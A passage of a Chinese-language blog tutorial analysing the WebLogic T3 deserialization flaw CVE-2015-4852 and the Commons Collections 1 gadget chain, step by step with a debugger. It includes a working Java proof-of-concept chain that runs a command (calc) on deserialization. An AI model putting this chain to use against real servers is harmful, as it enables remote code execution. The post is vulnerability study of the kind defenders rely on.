<p><img src="/imgs/image-20200723164920876.png" alt="image-20200723164920876"></p>
<p>chunkedpos从533-595，[Lorg.apache.commons.collections.Transformer;</p>
<p><img src="/imgs/image-20200723165303093.png" alt="image-20200723165303093"></p>
<p>chunkedpos从595-708，org.apache.commons.collections.functors.ConstantTransformer</p>
<p><img src="/imgs/image-20200723165816296.png" alt="image-20200723165816296"></p>
<p>chunkedpos从708-742，java.lang.Runtime</p>
<p><img src="/imgs/image-20200723170135374.png" alt="image-20200723170135374"></p>
<p>chunkedpos从742-917，org.apache.commons.collections.functors.InvokerTransformer</p>
<p><img src="/imgs/image-20200723170853261.png" alt="image-20200723170853261"></p>
<p>chunkedpos从917-953，[Ljava.lang.Object;</p>
<p><img src="/imgs/image-20200723171216583.png" alt="image-20200723171216583"></p>
<p>chunkedpos从953-1018，[Ljava.lang.Class;</p>
<p><img src="/imgs/image-20200723171646692.png" alt="image-20200723171646692"></p>
<p>chunkedpos从1018-1055，java.lang.String</p>
<p><img src="/imgs/image-20200723171927667.png" alt="image-20200723171927667"></p>
<p>chunkedpos从1055-1131，java.lang.Object</p>
<p><img src="/imgs/image-20200723172637138.png" alt="image-20200723172637138"></p>
<p>chunkedpos从1131-1256，java.util.HashMap</p>
<p><img src="/imgs/image-20200723174345127.png" alt="image-20200723174345127"></p>
<p>chunkedpos从1256-1338，java.lang.annotation.Retention</p>
<p><img src="/imgs/image-20200723183948828.png" alt="image-20200723183948828"></p>
<p>根据上面的解析对应到包其实就是下面的图，也就是在反序列化过程中我们调用的类</p>
<p><img src="/imgs/image-20200723193140849.png" alt="image-20200723193311193"></p>
<img src="/imgs/image-20200723194727483.png" alt="image-20200723194727483"  />

<p>到这里我们解答了一开始提出的第一个问题：为什么CommonsCollections能在WebLogic中经过T3自动引发？<strong>在收到数据后Weblogic到底怎么操作然后调用CommonsCollections的</strong>？也就是刚刚说的wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev将T3数据流的序列化部分依次分块通过resolveClass()来解析类，因为没有在对序列化数据解析时判断他是否安全，没有任何过滤，所以可以直接调用CommonsCollections1中涉及到的所有类。</p>
<h3 id="CommonsCollections1分析"><a href="#CommonsCollections1分析" class="headerlink" title="CommonsCollections1分析"></a>CommonsCollections1分析</h3><p>第一个调用CommonsCollections的问题我们清楚了，现在需要探讨第二个问题为什么CommonsCollections<strong>能够引起命令执行</strong>？</p>
<p>网上模仿ysoserial的CommonsCollections1的代码，这里用的是LazyMap利用链</p>
<p><img src="/imgs/image-20200727142144289.png" alt="image-20200727142144289"></p>
<p>思路：执行代码生成序列化数据，在这个过程中深入看看到底是怎么执行的命令。这里有个坑，我刚开始执行的时候没有弹出计算器，用的jdk1.8_111，后来换了jdk1.6_45可以了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2015_4852</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String&gt; innerMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">handler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要导入CommonsCollections，因为在之前的weblogic包里面没有找到，就去容器里面找到了，导入到项目里面即可。</p>
<p><img src="/imgs/image-20200722194206028.png" alt="image-20200722194206028"></p>
<p>在Transformer[]数组这里打上断点，开始一步一步分析这段代码</p>
<p><img src="/imgs/image-20200727145037589.png" alt="image-20200727145037589"></p>
<p>为了方便梳理，我们分为三部分进行分析：</p>
<p><img src="/imgs/image-20200728102258009.png" alt="image-20200728102258009"></p>
<h4 id="分析第一部分"><a href="#分析第一部分" class="headerlink" title="分析第一部分"></a>分析第一部分</h4><p>先生成Transformer数组，值分别是1个ConstantTransformer对象和3个InvokerTransformer对象</p>
<p><img src="/imgs/image-20200727145114068.png" alt="image-20200727145114068"></p>
<p>先看下Transformer，CTRL+H可以看到Transformer的继承实现关系，ConstantTransformer和InvokerTransformer都实现了Transformer，这里提一下ChainedTransformer也实现了Transformer，后面会用到。</p>
<p><img src="/imgs/image-20200727111550828.png" alt="image-20200727111550828"></p>
<p><a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html" target="_blank" rel="noopener">Transformer</a>官方文档说明了这个接口主要是用来将一个对象转换为另一个对象</p>
<p><img src="/imgs/image-20200727144619522.png" alt="image-20200727144619522"></p>
<p>回到main，步入分析下每个对象的生成</p>
<p><img src="/imgs/image-20200727145122952.png" alt="image-20200727145122952"></p>
<p>ConstantTransformer(Object constantToReturn)，构造一个ConstantTransformer对象，并且设置对象的iConstant值为传入的参数值；重写transformer，返回构造函数传入的值，该值是class类型</p>
<p><img src="/imgs/image-20200727172157127.png" alt="image-20200727172157127"></p>
<p>InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)：构造函数获取方法名、参数类型、参数将其赋值给对象；transform(Object input) 获取类的方法名、参数类型、参数 <strong>采用<a href="/2020/06/12/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">反射机制</a>调用该方法</strong></p>
<p><img src="/imgs/image-20200727185743443.png" alt="image-20200727185743443"></p>
<p>new Transformer[]完成，此时我们生成了一个transformer数组如下图</p>
<p><img src="/imgs/image-20200728111018511.png" alt="image-20200728111018511"></p>
<p>接着new一个ChainedTransformer，F7步入分析</p>
<p><img src="/imgs/image-20200727203858505.png" alt="image-20200727203858505"></p>
<p>ChainedTransformer(Transformer[] transformers)：将参数Transformer数组 赋值给对象；transform(Object object)将TransFormer数组的值 依次执行数组每个对象的transform()方法，也就是按照数组顺序去调用transform()，这里有一点容易遗漏，每次调用完transform()会赋值给Object作为下一次调用transform的参数。</p>
<p><img src="/imgs/image-20200727195322478.png" alt="image-20200727195322478"></p>
<p>以上我们在分析transformer接口的实现类时都分析了它的实现方法transform()，这个是后面要用到的</p>
<p>到这里new ChainedTransformer()完成</p>
<h4 id="分析第二部分"><a href="#分析第二部分" class="headerlink" title="分析第二部分"></a>分析第二部分</h4><p>我们继续往下，生成一个HashMap的实例innerMap，接着调用LazyMap.decorate(innerMap, chain)</p>
<p><img src="/imgs/image-20200727211240947.png" alt="image-20200727211240947"></p>
<p>这里我们看下HashMap和LazyMap，以一段代码来分析下。我们测试了两个实例，一个时LazyMap的Factory factory，一个是LazyMap的Transformer factory。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Factory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String arg[])</span> </span>&#123;</span><br><span class="line">        testLazyMap();</span><br><span class="line">        testLazyMapTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLazyMap</span><span class="params">()</span> </span>&#123;   <span class="comment">//LazyMap的Factory factory测试</span></span><br><span class="line">        Factory valFactory = <span class="keyword">new</span> Factory() &#123;  <span class="comment">//创建一个工厂，实现create方法</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Factory test"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), valFactory);    <span class="comment">//当此lazyMap调用get(key)时，如果无此key则返回varFactory里create方法返回的值</span></span><br><span class="line">        lazyMap.put(<span class="string">"Map"</span>, <span class="string">"Maptest"</span>);</span><br><span class="line">        System.out.println(lazyMap.get(<span class="string">"Map"</span>));    <span class="comment">//有key对应的值时</span></span><br><span class="line">        System.out.println(lazyMap.get(<span class="number">123</span>));   <span class="comment">//无此key时自动调用varFactory里create方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLazyMapTransformer</span><span class="params">()</span> </span>&#123;   <span class="comment">//LazyMap的Transformer factory测试</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> Transformer() &#123;<span class="comment">//创建一个transformer</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Transformer test"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformer);    <span class="comment">//当此lazyMap调用get(key)时，如果无此key则调用Transformer的transform方法</span></span><br><span class="line">        lazyMap.put(<span class="string">"Map"</span>, <span class="string">"Maptest"</span>);</span><br><span class="line">        System.out.println(lazyMap.get(<span class="string">"Map"</span>));    <span class="comment">//有key对应的值时</span></span><br><span class="line">        System.out.println(lazyMap.get(<span class="number">123</span>));   <span class="comment">//无此key时自动调用Transformer的transform方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/image-20200728105558850.png" alt="image-20200728105558850"></p>
<p>从以上代码我们可以看出，在testLazyMapTransformer中，我们首先实现了Transformer，重写了transform方法，然后new了一个普通的HashMap，调用LazyMap.decorate(new HashMap(), transformer)，相当于提前定义了在hashMap中对没有key存在的情况的处理方法，就是调用Transformer.transform()。</p>
<p>现在我们回来刚刚的位置，调用LazyMap，步入分析LazyMap将innerMap和chain赋值给对象的属性map和factory，这里chain也是Transformer类型的。根据我们上面的分析，在调用LazyMap.decorate(innerMap, chain)的时候，就是定义了innerMap的无key处理方法：去自动调用chain.transform()。</p>
<p><img src="/imgs/image-20200727210203651.png" alt="image-20200727210203651"></p>
<p>到这里我们基本已经清晰了一半</p>
<ol>
<li>创建了一个Transform数组，这个数组的值是一个ContranTransformer和三个InvokerTransformer对象，ContranTransformer.transformer()可以返回class【这里是Runtime】，而InvokerTransformer可以通过反射机制去执行我们想要执行的方法，也就是getRuntime()、invoke、exec</li>
<li>new ChainedTransformer(transformers)创建一个ChainedTransformer实例，将Transform数组赋值给对象，ChainedTransformer.transform()将TransFormer数组的每个对象按照顺序依次执行数组每个对象的transform()方法</li>
<li>LazyMap.decorate(innerMap, chain)定义了innerMap的无key处理方法：去自动调用chain.transform()</li>
<li>完成以上三步，当我们获取LazyMap的key不存在时，就会去调用chain.transform()，从而依次4个对象的transform()，也就是下图 1 先获取类Runtime，2 getMethod(getRuntime)，3 invoke()，4 exec(“calc”)，因为前一个执行的结果会作为参数给下一个调用，所以最后会执行Runtime.getRuntime().exec(“calc”)</li>
</ol>
<p><img src="/imgs/image-20200727204747709.png" alt="image-20200727204747709"></p>
<h4 id="分析第三部分"><a href="#分析第三部分" class="headerlink" title="分析第三部分"></a>分析第三部分</h4><p>继续往下分析，Class.forName获取AnnotationInvocationHandler类，接着 clazz.getDeclaredConstructor获取构造方法sun.reflect.annotation.AnnotationInvocationHandler(java.lang.Class, java.util.Map)，设置可调用</p>
<p><img src="/imgs/image-20200727213721378.png" alt="image-20200727213721378"></p>
<p>下面就是动态代理部分，结合之前学习的<a href="/2020/06/13/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4%EF%BC%9A">动态代理</a>步骤来理解下</p>
<p><img src="/imgs/image-20200727231807422.png" alt="image-20200727231807422"></p>
<p>1、(InvocationHandler) cons.newInstance(Override.class, lazyMap)相当于sun.reflect.annotation.AnnotationInvocationHandler(Override.class, LazyMap)，构造了一个AnnotationInvocationHandler实例handler。学习动态代理时我们知道需要InvocationHandler的invoke()来进行代理，所以AnnotationInvocationHandler必须实现了InvocationHandler和重写Invoke方法。所以这里我们分析下AnnotationInvocationHandler的构造函数和Invoke方法。</p>
<p>AnnotationInvocationHandler(Override.class, lazyMap)构造方法将参数值赋给属性；</p>
<p>结合下面创建代理用的接口是Map，分析invoke()，重点是三步：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var2是Map接口的某个方法</span></span><br><span class="line"><span class="comment">//获取方法名</span></span><br><span class="line">String var4 = var2.getName();</span><br><span class="line"><span class="comment">//获取方法的参数类型，var3是传入的参数</span></span><br><span class="line">Class[] var5 = var2.getParameterTypes();</span><br><span class="line"><span class="comment">//LazyMap.get(Map任一方法的名称)，这里是非常关键的一点，这一这里用到了LazyMap的get方法也就是get Key，上面分析过，key不存在时，就会去调用chain的transform()</span></span><br><span class="line">Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/image-20200728145807642.png" alt="image-20200728145807642"></p>
<p>2、LazyMap.class.getClassLoader()指定LazyMap的类加载、LazyMap.class.getInterfaces()指定LazyMap的接口作为被代理的对象，那么就是LazyMap继承的接口Map的方法，所以其实这里被代理对象是Map的方法</p>
<p>3、Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler)：结合上面1、2步骤的分析其实很清楚了，用handler的invoke()代理Map接口的方法，而invoke()中有关键的一步this.memberValues.get(var4)，会调用LazyMap.get(Map任一方法的名称)，从而调用chain.transform()。所以当我们调用mapProxy的被代理方法，也就是Map的任一方法就会去触发调用invoke()从而调用chain.transform()</p>
<p>4、InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class, mapProxy)：创建一个实例handler1，这时将mapProxy赋值给this.memberValues</p>
<p>5、下面就是序列化和反序列，在这里我困惑了好久，不知道到底怎么去调用的Map的某个方法来触发的。ysoserial的Gadget chain里面有AnnotationInvocationHandler.readObject，没理解怎么就调用了AnnotationInvocationHandler.readObject()，看了E_Bwill大佬的<a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a>我终于明白了。</p>
<p>看下面的这个例子，我们要进行序列化的对象如果重写了readObject()方法，在反序列化时会调用重写后的readObject()。这也就解释了为什么Object obj = (Object) ois.readObject()这里会调用AnnotationInvocationHandler.readObject()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadObjectTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建一个ReadObjectOverride对象</span></span><br><span class="line">        ReadObjectOverride readObjectOverride = <span class="keyword">new</span> ReadObjectOverride();</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(readObjectOverride);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadObjectOverride</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而AnnotationInvocationHandler.readObject()里面调用了我们刚刚分析的触发点Map接口的方法也就是Map.entrySet()。</p>
<p><img src="/imgs/image-20200728165240568.png" alt="image-20200728165240568"></p>
<p>梳理下：</p>
<ol>
<li>首先利用ChainedTransformer的transform()的循环调用特性创建了exec执行链chain</li>
<li>利用LazyMap的decorate()定义了get key不存在时的调用Transformer工厂chain.transform()</li>
<li>找到条件去get(不存在的key)从而调用工厂，这个条件就是动态代理AnnotationInvocationHandler.invoke()</li>
<li>创建动态代理来代理Map的所有接口，只要调用Map的接口就会去调用代理方法AnnotationInvocationHandler.invoke()</li>
<li>找到触发点触发代理invoke()，就是AnnotationInvocationHandler.readObject()，因为readObject()调用了Map接口entrySet()</li>
</ol>
<h2 id="0x03-思考和启发"><a href="#0x03-思考和启发" class="headerlink" title="0x03 思考和启发"></a>0x03 思考和启发</h2><p>在前言的问题“为什么CommonsCollections<strong>能够引起命令执行</strong>，需要什么条件？有哪些类是类似的？”我们解决了前一部分问题，哪些类是类似的，可以被用作反序列来执行命令，需要我们去寻找。</p>
<p>通过上面的分析也给我们后续学习或者挖洞提供了一点思路：首先我们需要找一个接收<strong>序列化数据的入口</strong>，便于我们传序列化数据，传入后程序需要进行<strong>反序列化</strong>；然后我们需要找到能够<strong>执行命令的利用链</strong>，并且这个利用链是<strong>不被服务器拦截</strong>的。</p>
<p> 还是那句话，纸上得来终觉浅， 绝知此事要躬行。</p>
<h2 id="0x04-参考链接："><a href="#0x04-参考链接：" class="headerlink" title="0x04 参考链接："></a>0x04 参考链接：</h2><p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#commons" target="_blank" rel="noopener">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</a><br><a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html" target="_blank" rel="noopener">IDEA+docker，进行远程漏洞调试（weblogic）</a><br><a href="https://www.anquanke.com/post/id/195865" target="_blank" rel="noopener">以Commons-Collections为例谈Java反序列化POC的编写</a><br><a href="https://www.cnblogs.com/ssooking/p/5875215.html" target="_blank" rel="noopener">Java反序列化漏洞分析    </a><br><a href="https://blog.csdn.net/simonnews/article/details/105765017" target="_blank" rel="noopener">Weblogic漏洞Java反序列化CVE-2015-4852解析</a><br><a href="https://www.iteye.com/blog/shukuiyan-2298947" target="_blank" rel="noopener">BidiMap-MultiMap-LazyMap</a><br><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现"><span class="toc-number">2.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-深入分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 深入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#远程调试"><span class="toc-number">3.1.</span> <span class="toc-text">远程调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic源码分析"><span class="toc-number">3.2.</span> <span class="toc-text">Weblogic源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections1分析"><span class="toc-number">3.3.</span> <span class="toc-text">CommonsCollections1分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析第一部分"><span class="toc-number">3.3.1.</span> <span class="toc-text">分析第一部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析第二部分"><span class="toc-number">3.3.2.</span> <span class="toc-text">分析第二部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析第三部分"><span class="toc-number">3.3.3.</span> <span class="toc-text">分析第三部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-思考和启发"><span class="toc-number">4.</span> <span class="toc-text">0x03 思考和启发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考链接："><span class="toc-number">5.</span> <span class="toc-text">0x04 参考链接：</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&text=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
